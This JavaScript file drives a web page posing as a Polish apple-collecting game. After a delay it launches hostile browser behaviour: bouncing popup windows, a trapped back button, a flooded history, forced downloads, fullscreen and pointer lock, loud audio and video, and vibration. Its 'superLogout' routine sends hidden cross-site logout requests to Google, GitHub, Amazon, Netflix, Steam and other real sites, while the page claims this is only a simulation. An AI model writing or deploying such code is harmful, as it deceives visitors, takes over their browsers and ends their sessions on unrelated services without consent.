const SCREEN_WIDTH = window.screen.availWidth
const SCREEN_HEIGHT = window.screen.availHeight
const WIN_WIDTH = 480
const WIN_HEIGHT = 260
const VELOCITY = 15
const MARGIN = 10
const TICK_LENGTH = 50

const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'

const VIDEOS = [
  'media/videos/jaczup.mp4',
  'media/videos/duck.mp4',
  'media/videos/rickroll.mp4',
  'media/videos/golomb.mp4',
  'media/videos/mushbox.mp4',
  'media/videos/clearmax.mp4',
  'media/videos/freestrona.mp4',
  'media/videos/ajhsdfhjasdbhfjasdfs.mp4',
  'media/videos/v09044g40000cgr968jc77u1t2krb89g.mp4',
  'media/videos/intro.mp4',
  'media/videos/szybkakaczka.mp4', 
  'media/videos/kaczuszka.mp4', 
  'media/videos/gratulacje.mp4', 
  'media/videos/puddi.mp4', 
  'media/videos/speed.mp4', 
  'media/videos/aluniasz.mp4',
  'media/videos/6am.mp4',
  'media/videos/troszkegłośno.mp4',
  'media/videos/ahhh.mp4'
]

const FILE_DOWNLOADS = [
  'media/images/aluni.jpg',
  'media/images/jaczupme.jpg',
  'media/images/rusek.jpg',
  'media/images/tysiaczek.jpg',
  'media/images/robin.jpg',
  'media/images/kyousuke.jpg',
  'media/images/electricblanket.jpg',
  'media/images/Truekupatester.jpg',
]

const LOGOUT_SITES = {
  Discord: ['POST', 'https://discord.com/api/v9/auth/logout', {provider: null, voip_provider: null}],
  Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
  GitHub: ['GET', 'https://github.com/logout'],
  GMail: ['GET', 'https://mail.google.com/mail/?logout'],
  Google: ['GET', 'https://www.google.com/accounts/Logout'],
  NetFlix: ['GET', 'https://www.netflix.com/Logout'],
  'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
  'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
  Allegro: ['GET', 'https://allegro.pl/wyloguj?origin_url=/'],
  OLX: ['GET', 'https://www.olx.pl/account/logout'],
  Roblox:  ['POST', 'https://auth.roblox.com/v2/logout'],
  ChatGPT: ['GET', 'https://chatgpt.com/auth/logout'],
  Spotify: ['GET', 'https://www.spotify.com/logout/'],
  Instagram: ['GET', 'https://www.instagram.com/accounts/logout/']
}

const wins = []
let interactionCount = 0
let attackStarted = false

const isChildWindow = (window.opener && isParentSameOrigin()) ||
  window.location.search.indexOf('child=true') !== -1
const isParentWindow = !isChildWindow

document.addEventListener('DOMContentLoaded', () => {
  const startBtn = document.getElementById('start-btn')
  const startBox = document.getElementById('start-box')
  const loadingScreen = document.getElementById('loading-screen')

  if (startBtn) {
    startBtn.addEventListener('click', () => {
      startBox.style.display = 'none'
      loadingScreen.style.display = 'block'

      // Krok 1: Ekran ładowania trwający dokładnie 9 sekund
      setTimeout(() => {
        loadingScreen.innerHTML = '<h2>Gra załadowana! Zbieraj jabłka...</h2><p>Gra działa w tle.</p>'
        
        // Krok 2: Odczekanie kolejnych 15 sekund przed uruchomieniem pełnego symulatora zagrożeń
        setTimeout(() => {
          attackStarted = true
          initPayloads()
        }, 15000)

      }, 9000)
    })
  }

  if (isChildWindow) {
    setTimeout(() => {
      attackStarted = true
      initPayloads()
    }, 5000)
  }
})

function initPayloads() {
  init()
  if (isChildWindow) initChildWindow()
  else initParentWindow()
}

function init () {
  confirmPageUnload()
  
  const audio = new Audio('media/audio/robalini.wav')
  audio.volume = 1.0
  audio.loop = true
  audio.play().catch(() => {})

  interceptUserInput(event => {
    if (!attackStarted) return;
    
    interactionCount += 1
    event.preventDefault()
    event.stopPropagation()

    if (event.which !== 0) openWindow()

    startVibrateInterval()
    enablePictureInPicture()
    triggerFileDownload()
    focusWindows()
    speak()

    if (event.key === 'Meta' || event.key === 'Control') {
      window.print()
    } else {
      requestPointerLock()
      requestFullscreen()
    }
  })
}

function initChildWindow () {
  hideCursor()
  moveWindowBounce()
  startVideo()
  detectWindowClose()
  triggerFileDownload()
}

function initParentWindow () {
  blockBackButton()
  fillHistory()
  startInvisiblePictureInPictureVideo()

  if (attackStarted) {
    hideCursor()
    startVideo()
    startAlertInterval()
    superLogout()
  }
}

function isParentSameOrigin () {
  try {
    return window.opener.location.origin === window.location.origin
  } catch (err) {
    return false
  }
}

function confirmPageUnload () {
  window.addEventListener('beforeunload', event => {
    event.returnValue = true
  })
}

function requestPointerLock () {
  const requestPointerLockApi = document.body.requestPointerLock || document.body.webkitRequestPointerLock
  if (requestPointerLockApi) requestPointerLockApi.call(document.body)
}

function startVibrateInterval () {
  if (typeof window.navigator.vibrate !== 'function') return
  setInterval(() => {
    window.navigator.vibrate(300)
  }, 1000)
}

function interceptUserInput (onInput) {
  document.body.addEventListener('touchstart', onInput, { passive: false })
  document.body.addEventListener('mousedown', onInput)
  document.body.addEventListener('click', onInput)
  document.body.addEventListener('keydown', onInput)
}

function startInvisiblePictureInPictureVideo () {
  const video = document.createElement('video')
  video.src = VIDEOS[0]
  video.loop = true
  video.muted = true
  video.style = HIDDEN_STYLE
  video.autoplay = true
  video.play().catch(() => {})
  document.body.appendChild(video)
}

function enablePictureInPicture () {
  const video = document.querySelector('video')
  if (video && document.pictureInPictureEnabled) {
    video.style = ''
    video.muted = false
    video.requestPictureInPicture().catch(() => {})
  }
}

function focusWindows () {
  wins.forEach(win => {
    if (!win.closed) win.focus()
  })
}

function openWindow () {
  const { x, y } = getRandomCoords()
  const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
  const win = window.open(window.location.pathname, '', opts)
  if (!win) return
  wins.push(win)

  win.addEventListener("beforeunload", function (e) {
    e.preventDefault();
    e.returnValue = "";
  });
}

function hideCursor () {
  document.querySelector('html').style = 'cursor: none;'
}

function triggerFileDownload () {
  const fileName = FILE_DOWNLOADS[Math.floor(Math.random() * FILE_DOWNLOADS.length)]
  const a = document.createElement('a')
  a.href = fileName
  a.download = fileName
  a.click()
}

function speak () {
  const utterances = [
    "Fajna gierka nie?.",
    "Nigdy nie klikaj w nieznane linki w Internecie!",
    "Strone mozna wylaczyc.Ale uwazaj w sieci braciszku."
  ];
  const phrase = utterances[Math.floor(Math.random() * utterances.length)];
  window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase))
}

function moveWindowBounce () {
  let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
  let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1)

  setInterval(() => {
    const x = window.screenX
    const y = window.screenY
    const width = window.outerWidth
    const height = window.outerHeight

    if (x < MARGIN) vx = Math.abs(vx)
    if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx)
    if (y < MARGIN + 20) vy = Math.abs(vy)
    if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy)

    window.moveBy(vx, vy)
  }, TICK_LENGTH)
}

function startVideo () {
  const video = document.createElement('video')
  video.src = VIDEOS[Math.floor(Math.random() * VIDEOS.length)]
  video.autoplay = true
  video.loop = true
  video.style = 'width: 100%; height: 100%; position: fixed; top: 0; left: 0; z-index: 1000;'
  document.body.appendChild(video)
}

function detectWindowClose () {
  window.addEventListener('unload', () => {
    if (window.opener && !window.opener.closed) window.opener.onCloseWindow(window)
  })
}

function onCloseWindow (win) {
  const i = wins.indexOf(win)
  if (i >= 0) wins.splice(i, 1)
}

function requestFullscreen () {
  const requestFullscreenFn = Element.prototype.requestFullscreen || Element.prototype.webkitRequestFullscreen
  if (requestFullscreenFn) requestFullscreenFn.call(document.body).catch(() => {})
}

function superLogout () {
  function cleanup (el) {
    if (el && el.parentNode) el.parentNode.removeChild(el)
  }

  function get (url) {
    const img = document.createElement('img')
    img.onload = () => cleanup(img)
    img.onerror = () => cleanup(img)
    img.style = HIDDEN_STYLE
    document.body.appendChild(img)
    img.src = url
  }

  for (const name in LOGOUT_SITES) {
    const method = LOGOUT_SITES[name][0]
    const url = LOGOUT_SITES[name][1]
    if (method === 'GET') {
      get(url)
    }

    const div = document.createElement('div')
    div.innerText = `Wylogowywanie z serwisu ${name} (symulacja)...`
    const logoutMessages = document.querySelector('.logout-messages')
    if (logoutMessages) logoutMessages.appendChild(div)
  }
}

function blockBackButton () {
  window.addEventListener('popstate', () => {
    window.history.forward()
  })
}

function fillHistory () {
  for (let i = 1; i < 10; i++) {
    window.history.pushState({}, '', window.location.pathname + '?q=' + i)
  }
  window.history.pushState({}, '', window.location.pathname)
}

function getRandomCoords () {
  const x = MARGIN + Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
  const y = MARGIN + Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN))
  return { x, y }
}